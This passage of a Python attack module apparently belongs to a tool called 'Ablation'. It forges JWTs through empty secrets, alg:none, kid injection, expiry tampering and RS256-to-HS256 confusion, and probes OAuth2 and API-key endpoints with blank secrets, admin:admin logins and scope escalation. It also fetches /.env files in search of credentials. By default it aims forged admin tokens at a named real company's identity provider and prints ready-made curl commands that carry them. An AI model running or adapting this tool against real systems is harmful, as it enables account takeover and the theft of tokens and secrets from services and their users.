    for kid_val, label, secret in [
        ('',    'empty_kid',   b''),
        (None,  'null_kid',    b''),
        ('null', 'null_str',   b''),
        ('0',   'zero_kid',    b''),
    ]:
        header = {'alg': 'HS256', 'typ': 'JWT'}
        if kid_val is not None:
            header['kid'] = kid_val
        h_enc  = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        p_enc  = _b64url_encode(json.dumps(base_p, separators=(',', ':')).encode())
        msg    = f'{h_enc}.{p_enc}'.encode()
        sig    = _hs256_sign(msg, secret)
        token  = f'{h_enc}.{p_enc}.{_b64url_encode(sig)}'

        attacks.append({
            'attack_class': 'KID_BLANK_NULL',
            'description':  f'kid={kid_val!r} with empty secret (fall-through default key)',
            'kid':          kid_val,
            'secret_used':  repr(secret),
            'token':        token,
            'exploit':      (
                f'curl -H "Authorization: Bearer {token[:60]}..." '
                f'{target_base_url or "<target>"}/api/v1/'
            ),
        })

    return attacks


# ── JWT exp claim manipulation ────────────────────────────────────────────────

def attack_exp_bypass(token, secret=b''):
    """Test whether a server accepts expired JWTs.

    The 'exp' (expiration) claim is advisory — some servers skip validation.
    This is a common misconfiguration in microservice auth chains where the
    upstream validator has been removed but token forwarding remains.

    Attack variants generated:
      1. Expired token submitted as-is (tests if server rejects exp)
      2. exp set to epoch 0 (Jan 1, 1970) — clearly expired
      3. exp set to very large value (year 2099) — far future; tests max-age enforcement
      4. exp removed entirely — tests mandatory-exp enforcement
      5. exp = 'none' — type confusion if server parses loosely
      6. nbf (not-before) set in future — tests if server enforces nbf

    Args:
        token:  Existing JWT string (decoded to extract payload)
        secret: HS256 secret to re-sign with (use b'' for empty-key targets)

    Returns:
        list of {description, token, exp_value, attack_class, exploit}
    """
    header, payload, sig, parts = decode_jwt(token)
    if not header:
        return [{'error': 'invalid token'}]

    now    = int(time.time())
    alg    = header.get('alg', 'HS256')
    attacks = []

    def _forge_with_payload(p, description, attack_class, exp_val, extra=''):
        """Inner helper: forge token with modified payload."""
        forged = forge_token(p, secret=secret, alg='HS256')
        return {
            'attack_class': attack_class,
            'description':  description,
            'exp_value':    exp_val,
            'token':        forged,
            'exploit': (
                f'curl -H "Authorization: Bearer {forged[:70]}..." <target>/api/ '
                f'# {description}'
                + (f' {extra}' if extra else '')
            ),
        }

    # 1. Submit original token as-is (if already expired, tests lax validation)
    exp = payload.get('exp')
    if exp and exp < now:
        attacks.append({
            'attack_class': 'EXP_ALREADY_EXPIRED',
            'description':  f'Original token expired {(now - exp)//60} minutes ago — submit as-is',
            'exp_value':    exp,
            'token':        token,
            'exploit': (
                f'curl -H "Authorization: Bearer {token[:70]}..." <target>/api/'
                ' # Server accepts expired token -> missing exp validation'
            ),
        })

    # 2. exp = 0 (Unix epoch, 1970)
    p2 = dict(payload)
    p2['exp'] = 0
    p2['iat'] = now
    attacks.append(_forge_with_payload(p2,
        'exp=0 (Unix epoch 1970) — tests if server rejects clearly expired tokens',
        'EXP_EPOCH_ZERO', 0,
    ))

    # 3. exp = year 2099 (max future)
    p3 = dict(payload)
    p3['exp'] = 4102444800  # 2099-12-31 00:00:00 UTC
    p3['iat'] = now
    attacks.append(_forge_with_payload(p3,
        'exp=2099 — test enforcement of maximum token lifetime',
        'EXP_FAR_FUTURE', 4102444800,
    ))

    # 4. exp removed entirely — tests mandatory-exp enforcement (RFC 7519 sec. 4.1.4)
    p4 = dict(payload)
    p4.pop('exp', None)
    p4['iat'] = now
    attacks.append(_forge_with_payload(p4,
        'exp removed — tests if server requires exp claim (RFC 7519 sec. 4.1.4)',
        'EXP_MISSING', None,
    ))

    # 5. exp = 'none' string — type confusion attack on loose parsers
    #    Some JWT libraries cast claims to int lazily; string 'none' may pass
    p5 = dict(payload)
    p5['exp'] = 'none'
    p5['iat'] = now
    # Can't use forge_token (exp must be int) — build manually
    h_enc = _b64url_encode(json.dumps({'alg': 'HS256', 'typ': 'JWT'}, separators=(',', ':')).encode())
    p_enc = _b64url_encode(json.dumps(p5, separators=(',', ':')).encode())
    sig5  = _hs256_sign(f'{h_enc}.{p_enc}'.encode(), secret)
    tok5  = f'{h_enc}.{p_enc}.{_b64url_encode(sig5)}'
    attacks.append({
        'attack_class': 'EXP_TYPE_CONFUSION',
        'description':  "exp='none' string — type confusion on loose exp parsers",
        'exp_value':    'none',
        'token':        tok5,
        'exploit': (
            f'curl -H "Authorization: Bearer {tok5[:70]}..." <target>/api/'
            ' # Non-integer exp may bypass int-comparison check'
        ),
    })

    # 6. nbf = far future — tests if server enforces not-before
    p6 = dict(payload)
    p6['exp'] = now + 3600
    p6['iat'] = now
    p6['nbf'] = now + 86400 * 365  # 1 year in future
    attacks.append(_forge_with_payload(p6,
        'nbf set 1 year in future — tests if server enforces not-before claim',
        'NBF_FUTURE', now + 86400 * 365,
    ))

    return attacks


# ── JWT regex scanner ─────────────────────────────────────────────────────────

JWT_RE = re.compile(
    r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
)


def find_jwts_in_text(text):
    """Find all JWT-like strings in a blob of text."""
    return JWT_RE.findall(text)


def find_jwts_in_file(filepath):
    """Scan a file for embedded JWTs."""
    try:
        text = Path(filepath).read_text(errors='replace')
        return find_jwts_in_text(text)
    except Exception:
        try:
            # Binary scan
            data = Path(filepath).read_bytes()
            text = data.decode('utf-8', errors='replace')
            return find_jwts_in_text(text)
        except Exception:
            return []


# ── Main analyzer class ───────────────────────────────────────────────────────

class JWTCryptoAnalyzer:
    """JWT / SAML / crypto weakness analysis for Ablation."""

    def __init__(self, targets=None):
        """
        targets: list of base URLs to probe with forged tokens
                 default = MACSTADIUM_IDP endpoints
        """
        self.targets  = targets or [MACSTADIUM_IDP]
        self.findings = []

    # ── Token analysis ────────────────────────────────────────────────────────

    def analyze_token(self, token_str):
        """Full JWT weakness analysis.

        Returns: list of finding dicts
        """
        findings = []
        token_str = token_str.strip()

        header, payload, sig, parts = decode_jwt(token_str)
        if not header:
            findings.append({
                'type':        'JWT_PARSE_ERROR',
                'severity':    'INFO',
                'description': 'Could not parse JWT',
                'detail':      token_str[:80],
                'exploit':     '',
            })
            return findings

        alg = header.get('alg', '?')

        # 1. Algorithm classification
        alg_info = classify_algorithm(alg)
        if alg_info.get('vulnerable_to_quantum'):
            findings.append({
                'type':        'JWT_QUANTUM_VULNERABLE_ALG',
                'severity':    'MEDIUM',
                'description': f'JWT uses quantum-vulnerable algorithm: {alg}',
                'detail':      alg_info['notes'],
                'exploit':     f'Replacement: {alg_info["recommended_replacement"]}',
            })

        # 2. alg:none
        if alg.lower() == 'none':
            findings.append({
                'type':        'JWT_ALG_NONE',
                'severity':    'CRITICAL',
                'description': 'JWT uses alg:none — no signature verification',
                'detail':      f'header={json.dumps(header)} payload={json.dumps(payload)[:100]}',
                'exploit':     f'Token already unsigned. Modify payload freely and resubmit.',
            })

        # 3. HS256 empty secret
        if alg == 'HS256':
            ok, decoded = test_empty_secret(token_str)
            if ok:
                forged_admin = forge_token(
                    MACSTADIUM_FORGE_PAYLOADS[0], secret=b'', alg='HS256'
                )
                findings.append({
                    'type':        'JWT_EMPTY_SECRET',
                    'severity':    'CRITICAL',
                    'description': 'HS256 JWT signed with empty string secret — fully forgeable',
                    'detail':      f'Decoded payload: {json.dumps(decoded)[:200]}',
                    'exploit': (
                        'Forge admin token:\n'
                        '  python3 modules/jwt_crypto_analyzer.py --forge\n'
                        '\nForged admin token: ' + forged_admin
                    ),
                })

            # 4. Weak secret wordlist
            sec, decoded = test_known_weak_secrets(token_str)
            if sec is not None and not ok:  # don't double-report
                findings.append({
                    'type':        'JWT_WEAK_SECRET',
                    'severity':    'CRITICAL',
                    'description': f'HS256 JWT signed with known-weak secret: {sec!r}',
                    'detail':      f'Decoded payload: {json.dumps(decoded)[:200]}',
                    'exploit': (
                        f'Forge any payload signed with secret={sec!r}:\n'
                        '  python3 modules/jwt_crypto_analyzer.py <token> --forge\n'
                        f'  secret={sec!r}'
                    ),
                })

        # 5. alg:none attack (generate forged tokens)
        none_tokens = test_alg_none(token_str)
        if none_tokens and alg != 'none':
            findings.append({
                'type':        'JWT_ALG_NONE_ATTEMPT',
                'severity':    'HIGH',
                'description': 'Generated alg:none variants for testing',
                'detail':      f'{len(none_tokens)} variants generated',
                'exploit': (
                    f'Test each variant against the API:\n'
                    f'  curl -H "Authorization: Bearer {none_tokens[0]}" {MACSTADIUM_IDP}/api/v1/\n'
                    f'  curl -H "Authorization: Bearer {none_tokens[1]}" {MACSTADIUM_IDP}/api/v1/'
                ),
            })

        # 6. Expiry check
        exp = payload.get('exp') if payload else None
        if exp and isinstance(exp, (int, float)):
            remaining = int(exp) - int(time.time())
            if remaining < 0:
                findings.append({
                    'type':        'JWT_EXPIRED',
                    'severity':    'INFO',
                    'description': f'JWT expired {abs(remaining)//60} minutes ago',
                    'detail':      f'exp={exp}',
                    'exploit':     'Forge a fresh token with updated iat/exp if secret known',
                })

        # 7. Missing claims
        if payload:
            for claim in ('sub', 'iss', 'aud', 'exp'):
                if claim not in payload:
                    findings.append({
                        'type':        f'JWT_MISSING_{claim.upper()}',
                        'severity':    'LOW',
                        'description': f'JWT missing standard claim: {claim}',
                        'detail':      f'Present claims: {list(payload.keys())}',
                        'exploit':     f'May allow injection of {claim} in forged token without rejection',
                    })

        self.findings.extend(findings)
        return findings

    # ── File scanner ──────────────────────────────────────────────────────────

    def analyze_file(self, filepath):
        """Find and analyze all JWTs embedded in a file."""
        tokens = find_jwts_in_file(filepath)
        results = {'file': str(filepath), 'tokens_found': len(tokens), 'findings': []}
        for tok in tokens:
            f = self.analyze_token(tok)
            results['findings'].extend(f)
        return results

    # ── Target probing ────────────────────────────────────────────────────────

    def probe_targets(self, forged_token=None, payload=None, secret=b''):
        """Forge tokens (if not provided) and probe all configured targets.

        Returns: list of probe results
        """
        if forged_token is None:
            if payload is None:
                payload = MACSTADIUM_FORGE_PAYLOADS[0]
            forged_token = forge_token(payload, secret=secret, alg='HS256')

        all_results = []
        for base_url in self.targets:
            if 'macstadium' in base_url or 'idp' in base_url:
                results = probe_idp_macstadium(forged_token)
            else:
                # Generic Bearer probe
                sc, body = _http_get(
                    f'{base_url}/api/v1/',
                    headers={'Authorization': f'Bearer {forged_token}'}
                )
                results = [{'endpoint': f'{base_url}/api/v1/', 'status': sc,
                            'body_excerpt': (body or '')[:200], 'finding': None}]
            all_results.extend(results)

            # Flag successes
            for r in results:
                if r.get('status') == 200:
                    self.findings.append({
                        'type':        'FORGED_JWT_ACCEPTED',
                        'severity':    'CRITICAL',
                        'description': f'Forged JWT accepted at {r["endpoint"]}',
                        'detail':      f'Status 200 | Body: {r["body_excerpt"][:100]}',
                        'exploit': (
                            f'curl -sk -H "Authorization: Bearer {forged_token}" '
                            f'{r["endpoint"]}'
                        ),
                    })

        return all_results

    def probe_macstadium_all(self):
        """Probe MacStadium with all forge payload variants."""
        all_results = []
        for payload in MACSTADIUM_FORGE_PAYLOADS:
            token = forge_token(payload, secret=b'', alg='HS256')
            results = probe_idp_macstadium(token)
            all_results.append({
                'payload': payload,
                'token':   token,
                'probes':  results,
            })
        return all_results

    # ── Algorithm confusion attack ────────────────────────────────────────────

    def run_algorithm_confusion(self, token, public_key_pem):
        """RS256 -> HS256 algorithm confusion attack.

        Obtain public key from JWKS endpoint or TLS cert, then re-sign
        the token as HS256 using that PEM as the HMAC secret.

        Returns: forged token string or None
        """
        forged, err = attack_algorithm_confusion(token, public_key_pem)
        if err:
            self.findings.append({
                'type':        'ALG_CONFUSION_FAILED',
                'severity':    'INFO',
                'description': f'Algorithm confusion failed: {err}',
                'detail':      f'Token alg={decode_jwt(token)[0].get("alg") if token else "?"}',
                'exploit':     '',
            })
            return None

        self.findings.append({
            'type':        'ALG_CONFUSION_FORGED',
            'severity':    'CRITICAL',
            'description': 'RS256->HS256 algorithm confusion forged token generated',
            'detail': (
                'Server verifies RS256 with RSA public key. '
                'Vulnerable library dispatches on header["alg"] without pinning expected type. '
                'Forged token signed with HS256, HMAC secret = RSA public key PEM bytes.'
            ),
            'exploit': (
                f'curl -sk -H "Authorization: Bearer {forged[:80]}..." {MACSTADIUM_IDP}/api/v1/\n'
                'If 200: server accepts HS256 token signed with its own public key as secret.'
            ),
        })
        return forged

    def run_jwks_probe(self, base_url=None, extra_paths=None):
        """Probe JWKS endpoints and extract keys for confusion attacks.

        Returns: list of probe results with extracted key material.
        """
        base_url = base_url or MACSTADIUM_IDP
        results  = probe_jwks_endpoints(base_url, extra_paths)

        for r in results:
            if r.get('status') == 200 and r.get('keys'):
                self.findings.append({
                    'type':        'JWKS_ENDPOINT_EXPOSED',
                    'severity':    'MEDIUM',
                    'description': f'JWKS endpoint exposed: {r["url"]} ({len(r["keys"])} key(s))',
                    'detail': (
                        f'Keys: {json.dumps(r["keys"], indent=2)[:300]}\n'
                        f'Confusion vector: {r.get("confusion_vector", "")}'
                    ),
                    'exploit': (
                        f'1. Fetch JWK: curl -sk {r["url"]}\n'
                        f'2. Extract n,e from RSA JWK, reconstruct PEM\n'
                        '3. run_algorithm_confusion(token, pem) -> forged HS256 token\n'
                        '4. Submit to API endpoints'
                    ),
                })
        return results

    def run_kid_injection(self, payload=None, target_base_url=None):
        """Generate all kid injection attack payloads.

        Returns: list of attack dicts with forged tokens.
        """
        if payload is None:
            payload = MACSTADIUM_FORGE_PAYLOADS[0]

        target = target_base_url or MACSTADIUM_IDP
        attacks = attack_kid_injection(payload, target_base_url=target)

        for a in attacks:
            self.findings.append({
                'type':        f'KID_INJECTION_{a["attack_class"]}',
                'severity':    'HIGH',
                'description': a['description'],
                'detail':      f'kid={a["kid"]!r} | secret={a.get("secret_used")}',
                'exploit':     a['exploit'],
            })
        return attacks

    def run_exp_bypass(self, token, secret=b''):
        """Generate expired/manipulated exp claim attack payloads.

        Tests if the server enforces exp, nbf, and token lifetime.
        Returns: list of attack dicts.
        """
        attacks = attack_exp_bypass(token, secret=secret)

        for a in attacks:
            if 'error' in a:
                continue
            sev = 'HIGH' if a['attack_class'] in ('EXP_ALREADY_EXPIRED', 'EXP_MISSING') else 'MEDIUM'
            self.findings.append({
                'type':        f'EXP_MANIPULATION_{a["attack_class"]}',
                'severity':    sev,
                'description': a['description'],
                'detail':      f'exp={a.get("exp_value")}',
                'exploit':     a['exploit'],
            })
        return attacks

    # ── Report ────────────────────────────────────────────────────────────────

    def report(self):
        lines = ['=' * 60, 'JWT / CRYPTO WEAKNESS ANALYSIS', '=' * 60]

        if not self.findings:
            lines.append('No findings.')
            return '\n'.join(lines)

        crit  = [f for f in self.findings if f['severity'] == 'CRITICAL']
        high  = [f for f in self.findings if f['severity'] == 'HIGH']
        other = [f for f in self.findings if f['severity'] not in ('CRITICAL', 'HIGH')]

        lines.append(
            f'\nFindings: {len(self.findings)} '
            f'({len(crit)} CRITICAL, {len(high)} HIGH, {len(other)} other)'
        )

        for f in crit + high + other:
            lines.append(f'\n[{f["severity"]}] {f["type"]}')
            lines.append(f'  {f["description"]}')
            if f.get('detail'):
                for dl in f['detail'].splitlines():
                    lines.append(f'    {dl}')
            if f.get('exploit'):
                for el in f['exploit'].splitlines()[:4]:
                    lines.append(f'  EXPLOIT: {el}')

        return '\n'.join(lines)


# ── OAuth2 / API-key / token-storage / scope probing ─────────────────────────
# Source: AI Agents and Applications (Manning, 2024)
#   Ch.13 — Building and Consuming MCP Servers: API key storage in .env,
#            DANGEROUSLY_OMIT_AUTH flag, session token exposure in proxy logs.
#   Ch.14 — Productionizing AI Agents: scope enforcement at router and agent
#            level; agent-level guardrails as "belt-and-suspenders" against
#            out-of-scope escalation; production key management patterns.
#   OAuth2 RFC 6749 (grant types, scope), PKCE RFC 7636, RFC 8414 (metadata).


def _oauth_post(base_url: str, path: str, form_data: dict, timeout: float) -> tuple:
    """POST application/x-www-form-urlencoded to an OAuth token endpoint.

    OAuth 2.0 token endpoints require form encoding (RFC 6749 sec. 4.1.3), not
    JSON. Returns (status_code, response_body_str). Uses stdlib urllib only.
    """
    url  = base_url.rstrip('/') + path
    body = urllib.parse.urlencode(form_data).encode()
    hdrs = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept':       'application/json',
        'User-Agent':   'Mozilla/5.0',
    }
    ctx = _ssl_ctx()
    try:
        req = urllib.request.Request(url, data=body, headers=hdrs, method='POST')
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.status, resp.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')
    except Exception as e:
        return None, str(e)


def probe_oauth2_endpoints(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """Probe OAuth2 / OIDC discovery and token endpoints for auth misconfigurations.

    Source: AI Agents and Applications Ch.13 (MCP authorization strategy —
    automatic vs interactive approval), Ch.14 (scope enforcement at agent level,
    PKCE-less flows); OAuth2 RFC 6749; PKCE RFC 7636; metadata RFC 8414.

    Probes:
      GET  /.well-known/oauth-authorization-server
           JSON returned                             -> INFO    OAUTH_METADATA_EXPOSED
      GET  /.well-known/openid-configuration
           missing PKCE or dangerous scopes          -> MEDIUM  OIDC_CONFIG_EXPOSED
      POST /oauth/token  grant_type=client_credentials, client_secret=''
           access_token returned                     -> CRITICAL OAUTH_EMPTY_SECRET_ACCEPTED
      POST /oauth/token  grant_type=password, username=admin, password=admin
           access_token returned                     -> CRITICAL OAUTH_PASSWORD_GRANT_ADMIN

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    base   = f'{scheme}://{host}:{port}'
    findings: list = []

    # 1. OAuth Authorization Server Metadata (RFC 8414)
    sc, body = _http_get(f'{base}/.well-known/oauth-authorization-server', timeout=timeout)
    if sc == 200 and body:
        try:
            json.loads(body)  # confirm it's valid JSON before calling it a finding
            findings.append({
                'severity': 'INFO',
                'title':    'OAUTH_METADATA_EXPOSED',
                'detail':   (
                    'GET /.well-known/oauth-authorization-server returned JSON — '
                    'enumerates supported grant types, scopes, and endpoints (RFC 8414). '
                    f'Excerpt: {body[:200]}'
                ),
                'host': host,
                'port': port,
            })
        except (json.JSONDecodeError, ValueError):
            pass

    # 2. OpenID Connect discovery — flag missing PKCE or dangerous scopes
    sc2, body2 = _http_get(f'{base}/.well-known/openid-configuration', timeout=timeout)
    if sc2 == 200 and body2:
        try:
            oidc            = json.loads(body2)
            scopes_adv      = oidc.get('scopes_supported', [])
            pkce_methods    = oidc.get('code_challenge_methods_supported', [])
            danger_scopes   = [s for s in scopes_adv if s in ('admin', 'write', 'offline_access', 'openid')]
            detail_parts    = ['OIDC discovery at /.well-known/openid-configuration exposed.']
            if danger_scopes:
                detail_parts.append(f'Advertised scopes include: {danger_scopes}.')
            if not pkce_methods:
                detail_parts.append(
                    'code_challenge_methods_supported absent — '
                    'authorization code flow may lack PKCE enforcement (RFC 7636), '
                    'enabling authorization code interception attacks.'
                )
            findings.append({
                'severity': 'MEDIUM',
                'title':    'OIDC_CONFIG_EXPOSED',
                'detail':   ' '.join(detail_parts),
                'host': host,
                'port': port,
            })
        except (json.JSONDecodeError, ValueError):
            pass

    # 3. client_credentials with empty client_secret (RFC 6749 sec. 4.4)
    sc3, body3 = _oauth_post(base, '/oauth/token', {
        'grant_type':    'client_credentials',
        'client_id':     'test',
        'client_secret': '',
        'scope':         'openid',
    }, timeout)
    if sc3 == 200 and body3:
        try:
            resp3 = json.loads(body3)
            if resp3.get('access_token'):
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'OAUTH_EMPTY_SECRET_ACCEPTED',
                    'detail':   (
                        'POST /oauth/token with grant_type=client_credentials and empty client_secret '
                        'returned an access_token — server accepts unauthenticated client_credentials '
                        'flow; any caller can acquire tokens without credentials. '
                        f'Token excerpt: {resp3["access_token"][:80]}'
                    ),
                    'host': host,
                    'port': port,
                })
        except (json.JSONDecodeError, ValueError):
            pass

    # 4. Resource Owner Password Grant (RFC 6749 sec. 4.3) with admin:admin
    sc4, body4 = _oauth_post(base, '/oauth/token', {
        'grant_type': 'password',
        'username':   'admin',
        'password':   'admin',
        'scope':      'openid',
    }, timeout)
    if sc4 == 200 and body4:
        try:
            resp4 = json.loads(body4)
            if resp4.get('access_token'):
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'OAUTH_PASSWORD_GRANT_ADMIN',
                    'detail':   (
                        'POST /oauth/token with grant_type=password and admin:admin credentials '
                        'returned an access_token — default admin credential accepted on password grant. '
                        'Password grant is deprecated in OAuth 2.1 and should be disabled entirely. '
                        f'Token excerpt: {resp4["access_token"][:80]}'
                    ),
                    'host': host,
                    'port': port,
                })
        except (json.JSONDecodeError, ValueError):
            pass

    return findings


def probe_api_key_patterns(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """Probe for common API key misconfigurations in AI-agent infrastructure.

    Source: AI Agents and Applications Ch.13 (AccuWeather API key stored in .env,
    read via os.getenv; MCP proxy session token 8722a69c... visible in startup
    logs and URLs; DANGEROUSLY_OMIT_AUTH=true disables all token checks).

    Probes:
      GET /api/v1/keys or /api/keys (no auth)
           200 returned                             -> CRITICAL API_KEY_LIST_UNAUTH
      GET / with X-API-Key: 00000000-0000-0000-0000-000000000000
           200 returned                             -> CRITICAL NULL_UUID_API_KEY_ACCEPTED
      GET / with Authorization: Bearer test
           200 returned                             -> CRITICAL BEARER_TOKEN_NOT_VALIDATED
      GET /api/v1/whoami (no auth)
           200 returned                             -> HIGH     UNAUTHENTICATED_IDENTITY_ENDPOINT

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    base   = f'{scheme}://{host}:{port}'
    findings: list = []

    # 1. Unauthenticated API key list
    for kpath in ('/api/v1/keys', '/api/keys'):
        sc, body = _http_get(f'{base}{kpath}', timeout=timeout)
        if sc == 200 and body:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'API_KEY_LIST_UNAUTH',
                'detail':   (
                    f'GET {kpath} returned 200 without authentication — '
                    'API key enumeration possible without credentials. '
                    f'Response excerpt: {body[:200]}'
                ),
                'host': host,
                'port': port,
            })
            break  # one finding per host for this class

    # 2. Null UUID API key
    null_uuid = '00000000-0000-0000-0000-000000000000'
    sc2, body2 = _http_get(
        f'{base}/',
        headers={'X-API-Key': null_uuid, 'Accept': 'application/json'},
        timeout=timeout,
    )
    if sc2 == 200 and body2:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'NULL_UUID_API_KEY_ACCEPTED',
            'detail':   (
                f'GET / with X-API-Key: {null_uuid} returned 200 — '
                'all-zero UUID accepted as valid API key; '
                'key validation absent or regex-only (format match without database lookup). '
                f'Response excerpt: {body2[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # 3. Literal "test" Bearer token accepted — no JWT/signature validation
    sc3, body3 = _http_get(
        f'{base}/',
        headers={'Authorization': 'Bearer test', 'Accept': 'application/json'},
        timeout=timeout,
    )
    if sc3 == 200 and body3:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'BEARER_TOKEN_NOT_VALIDATED',
            'detail':   (
                'GET / with Authorization: Bearer test returned 200 — '
                'server accepts arbitrary bearer token strings without '
                'JWT format validation or signature verification. '
                f'Response excerpt: {body3[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # 4. Unauthenticated /whoami
    sc4, body4 = _http_get(f'{base}/api/v1/whoami', timeout=timeout)
    if sc4 == 200 and body4:
        findings.append({
            'severity': 'HIGH',
            'title':    'UNAUTHENTICATED_IDENTITY_ENDPOINT',
            'detail':   (
                'GET /api/v1/whoami returned 200 without authentication — '
                'identity endpoint exposes user, role, or tenant context unauthenticated. '
                f'Response excerpt: {body4[:200]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def check_token_storage_exposure(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """Check for exposed session/token storage endpoints and plaintext credential files.

    Source: AI Agents and Applications Ch.13 (MCP session token printed in cleartext
    to stdout at startup and embedded in proxy URLs; .env file used for API key
    storage without rotation or access controls), Ch.14 (production agents require
    data-scope guardrails; tokens must be scoped and short-lived).

    Probes:
      GET /api/v1/session or /sessions (no auth)
           200 returned                              -> CRITICAL SESSION_LIST_UNAUTH
      GET /api/v1/tokens (no auth)
           200 returned                              -> CRITICAL TOKEN_LIST_UNAUTH
      GET /api/v1/refresh_tokens (no auth)
           200 returned                              -> HIGH     REFRESH_TOKEN_LIST_UNAUTH
      GET /.env or /config.json
           credential patterns matched               -> CRITICAL CREDENTIALS_IN_CONFIG_FILE
           200 but no patterns                       -> HIGH     CONFIG_FILE_EXPOSED

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    base   = f'{scheme}://{host}:{port}'
    findings: list = []

    _CRED_RE = re.compile(
        r'(?:API_KEY|SECRET|PASSWORD|TOKEN|BEARER|CREDENTIAL|CLIENT_SECRET)\s*[=:]\s*\S+',
        re.IGNORECASE,
    )

    # 1. Session list
    for spath in ('/api/v1/session', '/sessions'):
        sc, body = _http_get(f'{base}{spath}', timeout=timeout)
        if sc == 200 and body:
            findings.append({
                'severity': 'CRITICAL',
                'title':    'SESSION_LIST_UNAUTH',
                'detail':   (
                    f'GET {spath} returned 200 without authentication — '
                    'active session enumeration possible; session tokens readable. '
                    f'Response excerpt: {body[:200]}'
                ),
                'host': host,
                'port': port,
            })
            break

    # 2. Token list — all issued tokens readable
    sc2, body2 = _http_get(f'{base}/api/v1/tokens', timeout=timeout)
    if sc2 == 200 and body2:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'TOKEN_LIST_UNAUTH',
            'detail':   (
                'GET /api/v1/tokens returned 200 without authentication — '
                'all issued tokens readable; attacker can harvest valid access tokens directly. '
                f'Response excerpt: {body2[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # 3. Refresh token list — long-lived tokens
    sc3, body3 = _http_get(f'{base}/api/v1/refresh_tokens', timeout=timeout)
    if sc3 == 200 and body3:
        findings.append({
            'severity': 'HIGH',
            'title':    'REFRESH_TOKEN_LIST_UNAUTH',
            'detail':   (
                'GET /api/v1/refresh_tokens returned 200 without authentication — '
                'long-lived refresh tokens enumerable; refresh tokens grant persistent '
                'access independent of access token expiry. '
                f'Response excerpt: {body3[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # 4. Credential files
    for cpath in ('/.env', '/config.json'):
        sc4, body4 = _http_get(f'{base}{cpath}', timeout=timeout)
        if sc4 == 200 and body4:
            cred_hits = _CRED_RE.findall(body4)
            if cred_hits:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'CREDENTIALS_IN_CONFIG_FILE',
                    'detail':   (
                        f'GET {cpath} returned 200 with credential-pattern matches: '
                        f'{cred_hits[:5]}. '
                        f'Response excerpt: {body4[:200]}'
                    ),
                    'host': host,
                    'port': port,
                })
            else:
                findings.append({
                    'severity': 'HIGH',
                    'title':    'CONFIG_FILE_EXPOSED',
                    'detail':   (
                        f'GET {cpath} returned 200 — configuration file publicly accessible; '
                        'no credential patterns matched by regex but manual review required. '
                        f'Response excerpt: {body4[:200]}'
                    ),
                    'host': host,
                    'port': port,
                })

    return findings


def probe_scope_escalation(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """Probe for OAuth2 scope escalation and admin endpoint ABAC failures.

    Source: AI Agents and Applications Ch.14 (guardrails must enforce scope at
    both router level and individual agent level — "belt-and-suspenders"; an
    agent called directly or reused in a different context must still enforce
    its own scope boundary); OAuth2 RFC 6749 sec. 3.3 (scope downscoping).

    Probes:
      POST /oauth/token scope=admin (no auth)
           admin scope granted                       -> CRITICAL ADMIN_SCOPE_ACCEPTED_WITHOUT_AUTH
      POST /oauth/token scope=* or broad scope set
           >=3 scopes granted                        -> MEDIUM   EXCESSIVE_SCOPE_GRANTED
      GET  /api/v1/admin with role=user HS256 token
           200 returned                              -> CRITICAL ADMIN_ENDPOINT_ACCESSIBLE_WITH_USER_TOKEN

    Args:
        host:    Target hostname or IP.
        port:    Target port (default 443).
        timeout: Per-request timeout in seconds.

    Returns:
        list of {severity, title, detail, host, port}
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    base   = f'{scheme}://{host}:{port}'
    findings: list = []

    # 1. Request admin scope without client authentication
    sc, body = _oauth_post(base, '/oauth/token', {
        'grant_type': 'client_credentials',
        'client_id':  'test',
        'scope':      'admin',
    }, timeout)
    if sc == 200 and body:
        try:
            resp = json.loads(body)
            if resp.get('access_token') and 'admin' in resp.get('scope', ''):
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'ADMIN_SCOPE_ACCEPTED_WITHOUT_AUTH',
                    'detail':   (
                        'POST /oauth/token with scope=admin and no client credentials '
                        'returned an access_token with admin scope granted — '
                        'server does not enforce scope downscoping or client authentication. '
                        f'Granted scope: {resp.get("scope", "")!r}. '
                        f'Token excerpt: {resp["access_token"][:80]}'
                    ),
                    'host': host,
                    'port': port,
                })
        except (json.JSONDecodeError, ValueError):
            pass

    # 2. Wildcard / excessive scope
    for scope_val in ('*', 'openid profile email offline_access'):
        sc2, body2 = _oauth_post(base, '/oauth/token', {
            'grant_type': 'client_credentials',
            'client_id':  'test',
            'scope':      scope_val,
        }, timeout)
        if sc2 == 200 and body2:
            try:
                resp2 = json.loads(body2)
                if resp2.get('access_token'):
                    granted = resp2.get('scope', '')
                    granted_list = granted.split()
                    if len(granted_list) >= 3:
                        findings.append({
                            'severity': 'MEDIUM',
                            'title':    'EXCESSIVE_SCOPE_GRANTED',
                            'detail':   (
